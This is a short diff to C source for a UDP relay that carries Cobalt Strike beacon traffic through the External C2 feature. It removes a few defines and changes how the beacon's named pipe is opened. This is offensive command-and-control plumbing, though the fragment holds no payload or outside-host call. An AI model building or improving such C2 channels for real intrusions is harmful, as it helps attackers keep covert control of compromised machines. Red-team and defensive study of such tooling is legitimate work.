@@ -5,14 +5,9 @@
  * Program to provide UDP communications for Cobalt Strike using the External C2 feature.
  */
 
-#pragma once
 #define _CRT_SECURE_NO_WARNINGS
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #pragma comment (lib, "Ws2_32.lib")
-
-#define FD_SETSIZE 1 //The default size of an FD set is 64 sockets, but we only need 1. Must be defined before including winsock2.h.
-#define INIT_SEQNUM 0 //Initial sequence number for the client's transmissions
-#define TIMEOUT_SEC  10 //number of seconds to wait before timeout. 
 
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -621,7 +616,7 @@ void main(int argc, char* argv[])
 		// Pipe str (i.e. "mIRC")
 		strcat(pipestr, pipe_str);
 		// Full string (i.e. "\\\\.\\pipe\\mIRC")
-		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);
+		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	}
 	debug_print("%s", "Connected to pipe!!\n");
 
